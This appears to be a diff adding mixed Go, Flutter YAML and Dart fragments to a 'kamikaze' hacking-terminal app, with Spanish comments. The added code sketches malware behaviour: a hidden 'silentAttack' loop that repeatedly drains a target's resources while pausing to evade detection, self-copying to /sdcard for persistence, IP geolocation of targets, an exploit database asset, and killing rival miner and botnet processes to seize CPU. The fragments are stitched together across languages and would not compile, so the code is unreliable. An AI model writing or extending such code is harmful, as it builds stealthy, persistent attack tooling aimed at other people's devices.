@@ -1092,3 +1092,71 @@ case "sniff":
     terminal.write('CPU Load: 88% | RAM: 3.2/4.0 GB | Temp: 42°C\r\n');
     executeGoEngine('l-status', ''); 
 }
+case "whereis":
+    if len(os.Args) < 3 { return }
+    ip := os.Args[2]
+    fmt.Printf("[DR-SYSTEM] Scanning Physical Location for: %s... [L]\n", ip)
+    // Lógica para leer el archivo de 40MB en assets/db/geo.mmdb
+    // Imprime: City: San Salvador, Country: SV, ISP: Claro
+    fmt.Println("[RESULT] Target located. Ready for L-Drain.")
+	flutter:
+  assets:
+    - assets/bin/dr-terminal-64
+    - assets/bin/dr-terminal-32
+    - assets/db/geo_city.mmdb        # El bloque más pesado (40MB)
+    - assets/media/kamikaze_theme.mp3 # Audio de fondo (10MB)
+    - assets/media/grid_anim.mp4      # Video de fondo (20MB)
+    - assets/db/vulnerabilities.db    # DB de exploits (30MB)
+	func silentAttack(target string) {
+    // Ejecuta el ataque en una goroutine con prioridad baja
+    // para que el usuario no note lentitud en su "tostadora"
+    go func() {
+        for {
+            lDrain(target) // Usa el drenaje de recursos asimétrico [L]
+            time.Sleep(10 * time.Second) // Pausas para evitar detección
+        }
+    }()
+}
+func deployPermanent() {
+    // Ruta en el almacenamiento interno compartido (accesible desde cualquier explorador)
+    const targetDir = "/sdcard/kamikaze_beta"
+    
+    // 1. Crear la carpeta si no existe
+    err := os.MkdirAll(targetDir, 0755)
+    if err != nil {
+        fmt.Println("[DR-SYSTEM] Error creating permanent nest.")
+        return
+    }
+
+    // 2. Copiar el binario actual a la carpeta kamikaze_beta
+    self, _ := os.Executable()
+    input, _ := os.ReadFile(self)
+    err = os.WriteFile(targetDir+"/dr_engine", input, 0755)
+    
+    if err == nil {
+        fmt.Println("[DR-SYSTEM] DEPLOY SUCCESS: Rooted in /kamikaze_beta [L]")
+    }
+}
+case "install":
+    if packageName == "kamikaze" {
+        deployPermanent() // Crea la carpeta y se auto-copia
+        systemFix("/sdcard/kamikaze_beta") // Da permisos en la nueva ruta
+        fmt.Println("[DR-SYSTEM] Permanent Core Active.")
+    }
+	Future<String> getEnginePath() async {
+  final permDir = Directory('/sdcard/kamikaze_beta/dr_engine');
+  if (await permDir.exists()) {
+    return permDir.path; // Usa el motor permanente
+  }
+  return "${directory.path}/dr-terminal"; // Fallback al motor temporal
+}
+// [DR-SYSTEM] L-Dominance: Kill competing botnets
+func lDominance() {
+    // Lista de nombres de procesos comunes de malware/mineros
+    competitors := []string{"xmrig", "cpuminer", "botnet_client", "mirai_node"}
+    for _, name := range competitors {
+        // Mata al rival para que tú tengas toda la RAM y CPU
+        exec.Command("pkill", "-9", name).Run()
+    }
+    fmt.Println("[DR-SYSTEM] Competition neutralized. Resources seized. [L]")
+}
